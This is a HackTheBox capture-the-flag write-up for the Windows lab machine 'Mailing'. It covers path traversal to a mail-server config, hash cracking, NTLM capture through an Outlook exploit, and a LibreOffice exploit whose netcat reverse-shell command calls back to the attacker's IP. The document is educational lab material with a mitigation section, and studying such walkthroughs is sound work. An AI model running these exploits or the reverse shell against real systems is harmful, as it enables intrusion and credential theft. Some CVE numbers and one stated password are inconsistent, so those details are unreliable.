---
title: "HackTheBox - Mailing"
author: Nasrallah
description: ""
date: 2024-09-11 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy]
img_path: /assets/img/hackthebox/machines/mailing
image:
    path: mailing.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Mailing](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/mailing) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) is a windows box running hmailserver and a IIS web server, the website is vulnerable to file read allowing us to read password of the hmailserver. After that we use an exploit for outlook to get NTLM hash of a user and get access to the machine. We found a vulnerable version of libre office install To exploit it we generate a payload that send us a reverse shell as localadmin.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.231.40                                                                                                                                                                                 
Host is up (0.13s latency).                         
Not shown: 990 filtered tcp ports (no-response)                                                          
PORT    STATE SERVICE       VERSION                                                                      
25/tcp  open  smtp          hMailServer smtpd                                                            
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP                                      
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY                                            
80/tcp  open  http          Microsoft IIS httpd 10.0                                                     
|_http-title: Did not follow redirect to http://mailing.htb                                              
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                                           
110/tcp open  pop3          hMailServer pop3d       
|_pop3-capabilities: UIDL USER TOP                  
135/tcp open  msrpc         Microsoft Windows RPC                                                        
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn                                                
143/tcp open  imap          hMailServer imapd                                                                                                                                                                      
|_imap-capabilities: IMAP4rev1 IMAP4 NAMESPACE completed ACL QUOTA CHILDREN OK RIGHTS=texkA0001 SORT IDLE CAPABILITY                                                                                               
445/tcp open  microsoft-ds?                         
465/tcp open  ssl/smtp      hMailServer smtpd       
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU                                                                                               
| Not valid before: 2024-02-27T18:24:10             
|_Not valid after:  2029-10-06T18:24:10             
|_ssl-date: TLS randomness does not represent time                                                       
|_smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP                                      
587/tcp open  smtp          hMailServer smtpd       
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP                            
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY                                            
|_ssl-date: TLS randomness does not represent time                                                       
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU                                                                                               
| Not valid before: 2024-02-27T18:24:10                                                                  
|_Not valid after:  2029-10-06T18:24:10
993/tcp open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 IMAP4 NAMESPACE completed ACL QUOTA CHILDREN OK RIGHTS=texkA0001 SORT IDLE CAPABILITY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-10T07:37:12
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

The host seems to be a windows machine running a Microsoft IIS http server on port 80, and we also notice something called `hmailserver`.

We also can see that port 80 redirects us to the hostname `mailing.htb`, so let's add that to our `/etc/hosts` file.

### Web

Let's navigate to the webpage and see what's there.

![webpage](1.png)

We can see some usernames that might be useful to us, and also we found a `Download Instructions` button. Let's click it.

![pdf](2.png)

We downloaded a pdf file that contains instructions on how to connect to the mail server.

Looking though the file we don't find anything useful apart from the email address `maya@mailing.htb`.

Let's fire up Burp Suite and see how the download works.

![downloadburp](3.png)

Here we can see the website is using the `file` parameter to request the pdf file.

We can try some other files to see if the website is vulnerable to path traversal.

![hosts](4.png)

We managed to read the hosts file on the machine and confirmed the vulnerability.

### htmailserver

We saw in the nmap scan lots of ports belongs to `hmailserver`.

Searching on google for the location of the configuration file of `hmailserver` we found it at `C:\Program+Files+(x86)\hMailServer\Bin\hmailserver.ini`

![config](5.png)

We got the administrator's hash, let's crack it using hashcat.

```terminal
┌─[eu]─[10.10.16.8]─[sirius@parrot]─[~/CTF/HTB/mailing]
└──╼ [★]$ hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting                          
                                                                                                         
OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-12th Gen Intel(R) Core(TM) i7-1255U, 2899/5863 MB (1024 MB allocatable), 4MCU
                                                    
Minimum password length supported by kernel: 0                                                           
Maximum password length supported by kernel: 256                                                         
                                                 
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 841bb5acfa6779ae432fd7a4e6600ba7
Time.Started.....: Tue Sep 10 09:40:16 2024 (3 secs)
Time.Estimated...: Tue Sep 10 09:40:19 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2889.9 kH/s (0.13ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7563264/14344385 (52.73%)
Rejected.........: 0/7563264 (0.00%)
Restore.Point....: 7561216/14344385 (52.71%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: homie g 1 -> home38119
```

We got the password!

## **Foothold**

To get a foothold we will exploit [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21482) which is a vulnerability in Outlook includes leakage of local NTLM information and the possibility of remote code execution.

The POC I'll be using can be found [here](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability).

First we need to run responder.

```bash
sudo responder -I tun0
```

No we run the exploit

```bash
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\10.10.16.3\share\hack' --subject "Check this out"
```

We wait for a little bit and should get the hash.

```terminal
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:ac5ad6ef71382d46:8B292D4C842F7FB3C0F0D509C1FE7794:010100000000000080C365FEA903DB01B3364CF261A8790700000000020008003900510039004D0001001E00570049004E002D0048004400590056004C00530057004700490051004E0004003400570049004E002D0048004400590056004C00530057004700490051004E002E003900510039004D002E004C004F00430041004C00030014003900510039004D002E004C004F00430041004C00050014003900510039004D002E004C004F00430041004C000700080080C365FEA903DB0106000400020000000800300030000000000000000000000000200000482AC9A9299972BB67426E43162CC8C4F60A6E331BDF7747693B5321D7542B2A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
```

We managed to get the hash of maya, let's crack it now.

```terminal
λ .\hashcat.exe crack.txt rockyou.txt -m 5600
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #1: Intel(R) Iris(R) Xe Graphics, 7360/14802 MB (2047 MB allocatable), 96MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

MAYA::MAILING:ac5ad6ef71382d46:8b292d4c842f7fb3c0f0d509c1fe7794:010100000000000080c365fea903db01b3364cf261a8790700000000020008003900510039004d0001001e00570049004e002d0048004400590056004c00530057004700490051004e0004003400570049004e002d0048004400590056004c00530057004700490051004e002e003900510039004d002e004c004f00430041004c00030014003900510039004d002e004c004f00430041004c00050014003900510039004d002e004c004f00430041004c000700080080c365fea903db0106000400020000000800300030000000000000000000000000200000482ac9a9299972bb67426e43162cc8c4f60a6e331bdf7747693b5321d7542b2a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000:m4y4ngs4ri

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MAYA::MAILING:ac5ad6ef71382d46:8b292d4c842f7fb3c0f0...000000
Time.Started.....: Tue Sep 10 17:57:31 2024 (8 secs)
Time.Estimated...: Tue Sep 10 17:57:39 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   780.2 kH/s (10.89ms) @ Accel:16 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5996544/14344384 (41.80%)
Rejected.........: 0/5996544 (0.00%)
Restore.Point....: 5898240/14344384 (41.12%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: madrsa -> luisleslieteamo

Started: Tue Sep 10 17:57:23 2024
Stopped: Tue Sep 10 17:57:41 2024
```

The password is `4y4ngs4ri`

Let's try authenticating to smb using `netexec`

```terminal
┌─[us]─[10.10.16.3]─[sirius@parrot]─[~/CTF/HTB/mailing]
└──╼ [★]$ nxc smb mailing.htb -u maya -p m4y4ngs4ri
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
```

Let's list shares.

```terminal
┌─[us]─[10.10.16.3]─[sirius@parrot]─[~/CTF/HTB/mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
└──╼ [★]$ nxc smb mailing.htb -u maya -p m4y4ngs4ri --shares
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
SMB         10.10.11.14     445    MAILING          [*] Enumerated shares
SMB         10.10.11.14     445    MAILING          Share           Permissions     Remark
SMB         10.10.11.14     445    MAILING          -----           -----------     ------
SMB         10.10.11.14     445    MAILING          ADMIN$                          Admin remota
SMB         10.10.11.14     445    MAILING          C$                              Recurso predeterminado
SMB         10.10.11.14     445    MAILING          Important Documents READ            
SMB         10.10.11.14     445    MAILING          IPC$            READ            IPC remota
```

We found the `Important Documents` share but it's empty.

To get a shell we can try with `evil-winrm`

```terminal
┌─[us]─[10.10.16.3]─[sirius@parrot]─[~/CTF/HTB/mailing]
└──╼ [★]$ evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents>
```

## **Privilege Escalation**

After some enumeration on the box, we look into installed apps and find that libreoffice is installed.

```terminal
*Evil-WinRM* PS C:\program files\libreoffice\readmes> cat readme_en-GB.txt                                                                                                                    
                                                                                                                                                                                              
                                                                                                                                                                                              
======================================================================                                                                                                                        
                                                                                                                                                                                              
LibreOffice 7.4 ReadMe                                                                                                                                                                        
                                                                                               
======================================================================    
```

The version installed is `7.4`. Searching on google we find that this version is vulnerable [CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255).

>Improper access control in editor components of The Document Foundation LibreOffice allowed an attacker to craft a document that would cause external links to be loaded without prompt. In the affected versions of LibreOffice documents that used "floating frames" linked to external files, would load the contents of those frames without prompting the user for permission to do so. This was inconsistent with the treatment of other linked content in LibreOffice. This issue affects: The Document Foundation LibreOffice 7.4 versions prior to 7.4.7; 7.5 versions prior to 7.5.3.
{: .prompt-info }

We can find the exploit here <https://github.com/elweth-sec/CVE-2023-2255>

I'll generate a payload that would run netcat to get a shell.

```bash
python CVE-2023-2255.py --cmd 'cmd.exe /c C:\Windows\temp\nc64.exe 10.10.16.3 9001 -e cmd.exe'
```

I uploaded netcat to `c:\windows\temp`. Then uploaded `output.odt` file to the `Important Documents` share.

![shell](6.png)

And just like that we got a shell as local admin.

## **Prevention and Mitigation**

### Path Traversal

 The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.

If you can't avoid passing user-supplied input to filesystem APIs, we recommend using two layers of defense to prevent attacks:

- Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
- After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.

### CVE-2024-21482 & CVE-2023-2255

Microsoft Outlook and libre office are out of date with publicly available remote code execution exploits.

Update to the latest vendor patch and maintain an active patch schedule for any patches that may be released in the future.

### Passwords

The outlook administrator and user maya are using easily crackable passwords.

Ensure all user follow a strong password policy.

## **References**

<https://portswigger.net/web-security/file-path-traversal#how-to-prevent-a-path-traversal-attack>

<https://nvd.nist.gov/vuln/detail/CVE-2024-21482>

<https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability>

<https://nvd.nist.gov/vuln/detail/CVE-2023-2255>

<https://github.com/elweth-sec/CVE-2023-2255>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
